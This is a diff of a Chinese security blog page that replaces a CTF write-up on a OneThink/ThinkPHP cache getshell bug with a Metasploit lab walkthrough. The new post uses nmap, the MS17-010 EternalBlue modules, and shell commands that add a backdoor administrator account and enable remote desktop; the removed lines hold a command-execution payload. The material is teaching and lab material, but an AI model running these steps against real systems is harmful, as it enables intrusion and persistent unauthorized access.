@@ -15,7 +15,7 @@
     <meta name="description" content="">
     <meta name="Cache-Control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>OneThink/Thinkphp 的缓存getshell漏洞 · Ywc&#39;s blog</title>
+    <title>Metasploit 渗透练习 · Ywc&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -210,7 +210,7 @@
                 <a href="/" >Ywc&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">OneThink/Thinkphp 的缓存getshell漏洞</a>
+                <a href="#" class="post-name">Metasploit 渗透练习</a>
             </div>
     </div>
     
@@ -242,7 +242,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            OneThink/Thinkphp 的缓存getshell漏洞
+            Metasploit 渗透练习
             <!-- 404 -->
             
         </h1>
@@ -261,18 +261,18 @@ height:50vh;
                 
                     <div class= post-intro-tags >
     
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞、CTF">漏洞、CTF</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags = "learn">learn</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">407</span> / Reading time: <span class="post-count">2 min</span></span>
+                        <span>Word count: <span class="post-count">588</span> / Reading time: <span class="post-count">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/09/11</span>
+                    <span class="post-intro-time">2018/09/29</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -396,31 +396,68 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><ul>
-<li><a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="noopener">链接1</a></li>
-<li><a href="http://www.admintony.com/AWD%E8%A5%BF%E7%9F%B3%E6%B2%B9%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93.html" target="_blank" rel="noopener">链接2</a></li>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>书到用时方恨少，还是要勤加练习才能应对各种比赛。</p>
+<h2 id="渗透测试环境准备"><a href="#渗透测试环境准备" class="headerlink" title="渗透测试环境准备"></a>渗透测试环境准备</h2><p>准备一台虚拟x64的windows7和一台kali机，两个都要设置成桥接模式。</p>
+<p>win7要打开网络共享</p>
+<p><img src="/2018/09/29/msf/1.png" alt="msf"></p>
+<p>看到上面这样子，就是成功了</p>
+<p>之后这台虚拟机就可以不用理它了，开着就好.</p>
+<h2 id="开始入侵"><a href="#开始入侵" class="headerlink" title="开始入侵"></a>开始入侵</h2><p>首先更新一下metasploit</p>
+<font color="red">msfupdate</font>
+
+<p>注意，最新版本的metasploit会提示<br><strong>msfupdate is no longer supported when Metasploit is part of the operating system. Please use ‘apt update; apt install metasploit-framework’</strong></p>
+<p>输入<font color="red">apt update &amp;&amp; apt install metasploit-framework</font> 更新系统。</p>
+<h3 id="信息收集—扫描局域网内的机器ip地址"><a href="#信息收集—扫描局域网内的机器ip地址" class="headerlink" title="信息收集—扫描局域网内的机器ip地址"></a>信息收集—扫描局域网内的机器ip地址</h3><p>一般使用nmap，也可以使用<a href="http://www.freebuf.com/sectool/118574.html" target="_blank" rel="noopener">xerosploit</a></p>
+<p>扫描存活主机：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.31.0/24</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2018/09/29/msf/2.png" alt="msf"></p>
+<p>发现使用vmware开的windows7虚拟机的ip地址</p>
+<p>扫描该主机存活端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.181</span><br></pre></td></tr></table></figure></p>
+<p>![msf(3.png)]</p>
+<p>发现开放445端口，OK，可以利用永恒之蓝漏洞进行攻击。</p>
+<h3 id="使用meatsploit攻击"><a href="#使用meatsploit攻击" class="headerlink" title="使用meatsploit攻击"></a>使用meatsploit攻击</h3><ul>
+<li>登录kali,启动meatsploit: <font color="red">msfconsole</font></li>
 </ul>
-<h2 id="题目思路"><a href="#题目思路" class="headerlink" title="题目思路"></a>题目思路</h2><p>进入题目后,不难发现<a href="http://www.zip的文件泄露，容易发现是onethink" target="_blank" rel="noopener">www.zip的文件泄露，容易发现是onethink</a> cms,是用thinkphp框架写的.</p>
-<p><img src="/2018/09/11/onethinkcms/1.png" alt="onethink"></p>
-<p>搜索后可发现已知漏洞:<a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-4918-1-1.html</a> 容易发现，该cms存在固定缓存文件名2bb202459c30a1628513f40ab22fa01a.php，观察<a href="http://www.zip下面的源代码可以发现对文件名又进行了一次md5，然后可以参照一叶飘零师傅的" target="_blank" rel="noopener">www.zip下面的源代码可以发现对文件名又进行了一次md5，然后可以参照一叶飘零师傅的</a> <a href="http://skysec.top/2018/07/23/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-Web%E8%A1%A5%E9%A2%98/" target="_blank" rel="noopener">博客</a> </p>
-<p>另外一种做法是，扫描目录得到<a href="http://www.zip下载源码,本地搭建起来环境后得到目录/Runtime/Temp/onethink_6d11f0be3af9c28d4120c8fd5fe65a40.ph" target="_blank" rel="noopener">www.zip下载源码,本地搭建起来环境后得到目录/Runtime/Temp/onethink_6d11f0be3af9c28d4120c8fd5fe65a40.ph</a>  后面参考郁离歌的<a href="http://120.79.189.7/?p=453" target="_blank" rel="noopener">做法</a></p>
-<p>我当时做时，搜到了以前题目的<a href="https://www.secpulse.com/archives/55862.html" target="_blank" rel="noopener">文章1</a><a href="https://bbs.ichunqiu.com/thread-4918-1-1.html" target="_blank" rel="noopener">文章2</a>按照该解题思路，没有操作成，显示用户名受到限制，以及在操作抓包时没有进行url-encode，没有进行本地搭建以及相关代码的审计(比如用户名限制)。</p>
-<h3 id="关键点"><a href="#关键点" class="headerlink" title="关键点"></a>关键点</h3><ul>
-<li>缓存文件路径</li>
-<li>用户注册成功并登陆成功（我试了很多都是用户收到限制或者不存在，姿势不对…）</li>
-<li>注册登陆必须每次抓包url解码后再发包回去</li>
-<li>每次注册和登陆在发包的时候URL-encode 必须勾选上再提交，否则会把换行符的url-encode当成字符串来处理。登陆的时候也需要抓包，在用户名前面加上换行符的URL-encode，且勾选上URL-encode.</li>
+<p><img src="/2018/09/29/msf/4.png" alt="msf"></p>
+<ul>
+<li>搜索永恒之蓝模块：<font color="red">search ms17-010</font></li>
 </ul>
-<h3 id="paylod"><a href="#paylod" class="headerlink" title="paylod"></a>paylod</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/Runtime/Temp/onethink_6d11f0be3af9c28d4120c8fd5fe65a40.php?X=system(‘cat /tmp/flag’);</span><br><span class="line"></span><br><span class="line">或/Runtime/Temp/onethink_6d11f0be3af9c28d4120c8fd5fe65a40.php?X=cat /flag&gt;/tmp/flag</span><br></pre></td></tr></table></figure>
-<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在菜的路上越走越远…….</p>
+<p><img src="/2018/09/29/msf/5.png" alt="msf"></p>
+<p>这里可以得到两个工具，其中<code>auxiliary/scanner/smb/smb_ms17_010</code>是永恒之蓝扫描模块, <code>exploit/windows/smb/ms17_010_eternalblue</code>是永恒之蓝攻击模块，一般配合使用，前者先扫描，若显示有漏洞，再进行攻击。</p>
+<ul>
+<li>使用检测模块：<font color="red">use auxiliary/scanner/smb/smb_ms17_010 </font>             </li>
+</ul>
+<font color="red">show options</font>       //show options或者options，查看需要填写的参数,其中标红处如果是yes，表示这行参数必须填写，如果是no，就是选填，其中有LHOST和RHOST是空,需要填写攻击目标主机的信息。<br><br>- 设置目标IP或网段：<font color="red">set RHOSTS 192.168.31.181</font>
+
+<ul>
+<li>执行扫描：<font color="red">run</font></li>
+</ul>
+<p>显示<strong>Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600 x64 (64-bit)</strong> 证明可以使用永恒之蓝进行攻击。</p>
+<p><img src="/2018/09/29/msf/6.png" alt="msf"></p>
+<ul>
+<li><p>使用攻击模块：<font color="red">use exploit/windows/smb/ms17_010_eternalblue</font>  </p>
+</li>
+<li><p>查看需要填写的参数：<font color="red">show options</font>                                   </p>
+</li>
+<li><p>设置攻击目标ip <font color="red">set RHOSTS 192.168.31.181</font></p>
+</li>
+<li><p>执行攻击 <font color="red">exploit</font></p>
+</li>
+</ul>
+<p><img src="/2018/09/29/msf/7.png" alt="msf"></p>
+<p><img src="/2018/09/29/msf/8.png" alt="msf"></p>
+<p>如图可见，攻击成功，之后就可以通过Shell对目标机进行控制。</p>
+<h3 id="通过Shell-对靶机进行控制"><a href="#通过Shell-对靶机进行控制" class="headerlink" title="通过Shell 对靶机进行控制"></a>通过Shell 对靶机进行控制</h3><p>创建用户名密码 blue/blue <code>net user blue blue /add</code></p>
+<p>将用户blue添加入管理组  <code>net localgroup administrators blue /add</code></p>
+<p>开启远程桌面功能  <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p>
+<p>Kali远程桌面连接Win7  <code>rdesktop 192.168.31.181:3389</code></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者: <a href="https://yinwc.github.io">Ywc</a>
-            <p>原文链接: <a href="https://yinwc.github.io/2018/09/11/onethinkcms/">https://yinwc.github.io/2018/09/11/onethinkcms/</a>
-            <p>发表日期: <a href="https://yinwc.github.io/2018/09/11/onethinkcms/">September 11th 2018, 6:23:01 pm</a>
+            <p>原文链接: <a href="https://yinwc.github.io/2018/09/29/msf/">https://yinwc.github.io/2018/09/29/msf/</a>
+            <p>发表日期: <a href="https://yinwc.github.io/2018/09/29/msf/">September 29th 2018, 7:30:30 pm</a>
             <p>版权声明: </p>
         </div>
     
@@ -428,17 +465,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2018/09/16/yilinbo/" title= 易霖博杯 赛后总结 >
-                    <div class="nextTitle">易霖博杯 赛后总结</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/09/11/blog/" title= 搭博客的经历 >
-                    <div class="prevTitle">搭博客的经历</div>
+                <a href= "/2018/09/28/Dmsj/" title= 代码审计练习 >
+                    <div class="prevTitle">代码审计练习</div>
                 </a>
             
         </li>
@@ -550,7 +582,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接："><span class="toc-number">1.</span> <span class="toc-text">参考链接：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目思路"><span class="toc-number">2.</span> <span class="toc-text">题目思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#关键点"><span class="toc-number">2.1.</span> <span class="toc-text">关键点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#paylod"><span class="toc-number">2.2.</span> <span class="toc-text">paylod</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">3.</span> <span class="toc-text">后记</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透测试环境准备"><span class="toc-number">2.</span> <span class="toc-text">渗透测试环境准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开始入侵"><span class="toc-number">3.</span> <span class="toc-text">开始入侵</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息收集—扫描局域网内的机器ip地址"><span class="toc-number">3.1.</span> <span class="toc-text">信息收集—扫描局域网内的机器ip地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用meatsploit攻击"><span class="toc-number">3.2.</span> <span class="toc-text">使用meatsploit攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通过Shell-对靶机进行控制"><span class="toc-number">3.3.</span> <span class="toc-text">通过Shell 对靶机进行控制</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
